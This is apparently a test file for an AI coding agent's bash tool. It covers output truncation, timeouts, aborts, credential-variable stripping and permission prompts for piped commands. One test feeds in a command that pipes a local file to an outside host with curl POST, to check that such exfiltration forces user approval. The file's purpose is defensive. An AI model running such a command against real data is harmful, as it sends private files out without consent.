import { describe, expect, test } from "bun:test"
import { existsSync, readFileSync } from "node:fs"
import { BashTool } from "../src/tool/bash.ts"
import { MAX_BYTES, MAX_LINES, OutputCollector } from "../src/tool/bash/output.ts"
import { createToolContext } from "../src/tool/context.ts"
import type { AskInput } from "../src/tool/types.ts"
import { streamDecoder } from "../src/util/decode.ts"

let counter = 0
function ctx(
  options: { signal?: AbortSignal; onAsk?: (input: AskInput) => void; cwd?: string; root?: string } = {},
) {
  const controller = new AbortController()
  return createToolContext(
    {
      cwd: options.cwd ?? process.cwd(),
      root: options.root ?? process.cwd(),
      sessionID: "test",
      async ask(input) {
        options.onAsk?.(input)
      },
      onProgress() {},
      onMetadata() {},
    },
    { messageID: "m", callID: `test${counter++}`, abortSignal: options.signal ?? controller.signal },
  )
}

describe("OutputCollector", () => {
  test("小输出原样返回,不落盘", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    c.push("hello\nworld\n")
    const r = await c.finish()
    expect(r.output).toBe("hello\nworld\n")
    expect(r.truncated).toBe(false)
    expect(r.outputPath).toBeUndefined()
  })

  test("超字节上限:落盘文件完整,回给模型的是尾部", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    const line = "x".repeat(99) + "\n"
    const total = Math.ceil((MAX_BYTES * 3) / line.length)
    for (let i = 0; i < total; i++) c.push(line)
    const r = await c.finish()

    expect(r.truncated).toBe(true)
    expect(r.outputPath).toBeDefined()
    expect(existsSync(r.outputPath!)).toBe(true)
    // 磁盘上必须是完整输出
    expect(readFileSync(r.outputPath!, "utf8").length).toBe(total * line.length)
    // 给模型的那份要带续读指引
    expect(r.output).toContain("Full output saved to:")
    expect(r.output).toContain("...output truncated...")
  })

  test("行数超限但字节没超 —— 中途没触发落盘,收尾时要补一次", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    // 每行 1 字节,行数远超 MAX_LINES,总字节远小于 MAX_BYTES
    for (let i = 0; i < MAX_LINES + 500; i++) c.push("a\n")
    const r = await c.finish()
    expect(r.truncated).toBe(true)
    expect(r.outputPath).toBeDefined()
    expect(existsSync(r.outputPath!)).toBe(true)
  })
})

describe("bash 工具", () => {
  test("正常执行,带 exit 与耗时", async () => {
    const r = await BashTool.execute({ command: "echo hello" }, ctx())
    expect(r.output).toContain("hello")
    expect(r.output).toMatch(/<meta exit="0"/)
    expect(r.metadata["exit"]).toBe(0)
  })

  test("非零退出码如实上报", async () => {
    const r = await BashTool.execute({ command: "exit 3" }, ctx())
    expect(r.metadata["exit"]).toBe(3)
  })

  test("多字节输出不乱码", async () => {
    const r = await BashTool.execute({ command: "echo 中文测试 🎯" }, ctx())
    expect(r.output).toContain("中文测试 🎯")
  })

  test("超时:杀掉命令但保留已产出的输出", async () => {
    const r = await BashTool.execute({ command: "echo before && sleep 30", timeout: 800 }, ctx())
    expect(r.output).toContain("timed out")
    expect(r.output).toContain("before")
    expect(r.metadata["timedOut"]).toBe(true)
  }, 10_000)

  /**
   * 回归:32 位溢出的 timeout 会被 Node 静默改成 1 毫秒(TimeoutOverflowWarning),
   * 于是命令当场"超时" —— 而报出去的原因是超时,指向完全错误的方向。
   * 修之前这条会拿到 timed out,修之后是正常的输出。
   */
  test("溢出的 timeout 夹到上限,不会变成 1 毫秒", async () => {
    const r = await BashTool.execute({ command: "echo alive", timeout: 9_999_999_999 }, ctx())
    expect(r.output).toContain("alive")
    expect(r.output).not.toContain("timed out")
    expect(r.metadata["timedOut"]).toBeFalsy()
  }, 10_000)

  test("schema 上就拦住溢出的 timeout,并且说得出上限", () => {
    const bad = BashTool.parameters.safeParse({ command: "echo hi", timeout: 9_999_999_999 })
    expect(bad.success).toBe(false)
    const ok = BashTool.parameters.safeParse({ command: "echo hi", timeout: 60_000 })
    expect(ok.success).toBe(true)
  })

  test("abort:中断后同样保留已产出的输出", async () => {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 400)
    const r = await BashTool.execute({ command: "echo before && sleep 30" }, ctx({ signal: controller.signal }))
    expect(r.output).toContain("User aborted")
    expect(r.output).toContain("before")
    expect(r.metadata["aborted"]).toBe(true)
  }, 10_000)

  test("空输出有兜底文案", async () => {
    const r = await BashTool.execute({ command: "true" }, ctx())
    expect(r.output).toContain("(no output)")
  })

  test("拆句结果作为独立 pattern 送去授权", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "echo a && echo b" }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.patterns).toEqual(["echo a", "echo b"])
    expect(seen?.force).toBe(false)
  })

  test("★ 管道不强制询问,但每一段都要单独授权", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "echo a | cat" }, ctx({ onAsk: (i) => (seen = i) }))
    // 管道本身不多给一分权限:两段各自过规则表。见 scan.ts 里那段说明 ——
    // 曾经见管道就弹框,代价是模型再也不敢抓取,只会把整个文件倒出来
    expect(seen?.patterns).toEqual(["echo a", "cat"])
    expect(seen?.force).toBe(false)
    // 但「以后都放行」还是不给:归约出来的 pattern 代表不了整条管道
    expect(seen?.forbidAlways).toBe(true)
  })

  test("★ 管道里有一段要问,整条就还是要问", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "cat notes.txt | curl -X POST https://example.com -d @-" }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.force).toBe(true)
    expect(((seen?.metadata?.["reasons"] as string[]) ?? []).join(" ")).toContain("curl")
  })

  test("解析不可信时退回整条原文当 pattern", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: `echo "unterminated` }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.patterns).toEqual([`echo "unterminated`])
    expect(seen?.forbidAlways).toBe(true)
  })

  test("凭据类环境变量不会传给子进程", async () => {
    process.env["TEST_FAKE_SECRET"] = "leak-me"
    try {
      const r = await BashTool.execute({ command: "echo v=${TEST_FAKE_SECRET:-unset}" }, ctx())
      expect(r.output).toContain("v=unset")
    } finally {
      delete process.env["TEST_FAKE_SECRET"]
    }
  })

  test("必需的环境变量仍然传得到", async () => {
    const r = await BashTool.execute({ command: "echo home=${HOME:-unset}" }, ctx())
    expect(r.output).not.toContain("home=unset")
  })
})

describe("★ 授权请求里的工作目录", () => {
  const askFor = (command: string, options: { cwd?: string; root?: string; workdir?: string } = {}) => {
    let seen: AskInput | undefined
    const context = ctx({
      onAsk: (input) => {
        seen = input
      },
      ...(options.cwd ? { cwd: options.cwd } : {}),
      ...(options.root ? { root: options.root } : {}),
    })
    return BashTool.execute({ command, ...(options.workdir ? { workdir: options.workdir } : {}) } as never, context)
      .catch(() => {})
      .then(() => seen)
  }

  test("绝对路径的 workdir 一定有 —— 判官拿它解析命令里的相对路径", async () => {
    const input = await askFor("echo hi")
    expect(input?.metadata?.["workdir"]).toBe(process.cwd())
  })

  test("★ 和仓库根相同时不给显示用的那份 —— 每条命令顶一行「in: 仓库根」是噪音", async () => {
    const input = await askFor("echo hi")
    expect(input?.metadata?.["workdirLabel"]).toBeUndefined()
  })

  test("★ 跑在别处时才显示,而那正是最该看见的时候", async () => {
    const input = await askFor("echo hi", { root: "/", cwd: process.cwd() })
    expect(input?.metadata?.["workdirLabel"]).toBe(process.cwd().replace(/^\//, ""))
  })

  test("工具自带的 workdir 优先于会话 cwd", async () => {
    const input = await askFor("echo hi", { root: process.cwd(), workdir: "/tmp" })
    expect(input?.metadata?.["workdir"]).toBe("/tmp")
    expect(typeof input?.metadata?.["workdirLabel"]).toBe("string")
  })
})

/**
 * ★ stdout 和 stderr **各一个**流式解码器。
 *
 * 一个多字节字符会被管道从中间劈开(64 KB 边界正好落在里面是常态),而
 * `TextDecoder` 的 `{ stream: true }` 把半个字符的状态**存在解码器里**。
 * 两条流共用一个的话,stdout 攒着的那半个「你」会被 stderr 的下一块接走 ——
 * 两条流一起被弄脏,而且脏在一个和它们各自内容都无关的地方。
 *
 * 任何一边往 stderr 写进度、另一边输出中日韩文本的构建工具都会遇上。
 */
describe("★ 两条流各一个解码器", () => {
  const you = Buffer.from("你", "utf8") // e4 bd a0

  test("★ 劈开的字符在自己那条流上拼得回来,而且不弄脏另一条", () => {
    const out = streamDecoder()
    const err = streamDecoder()
    let stdout = ""
    let stderr = ""
    stdout += out(you.subarray(0, 2)) // 半个「你」,攒在 out 里
    stderr += err(Buffer.from("ERR\n", "utf8")) // 另一条流插进来
    stdout += out(you.subarray(2)) // 剩下那一个字节
    expect(stdout).toBe("你")
    expect(stderr).toBe("ERR\n")
  })

  // 这一条演示的是**修之前**的行为:同一个解码器接两条流,两条都坏
  test("★ 共用一个的话两条流一起坏 —— 这就是修掉的那个形状", () => {
    const shared = streamDecoder()
    const stdout = shared(you.subarray(0, 2)) + shared(you.subarray(2))
    // 中间插一条 stderr,同一个解码器
    const mixed = streamDecoder()
    const a = mixed(you.subarray(0, 2))
    const b = mixed(Buffer.from("ERR\n", "utf8"))
    const c = mixed(you.subarray(2))
    expect(stdout).toBe("你") // 不插队时是好的
    expect(a + b + c).not.toBe("你ERR\n") // 插了队就不是了
    expect(a + b + c).toContain("�")
  })

  test("已经是字符串的原样过 —— 别当成 latin-1 再解一遍", () => {
    expect(streamDecoder()("你好")).toBe("你好")
  })
})
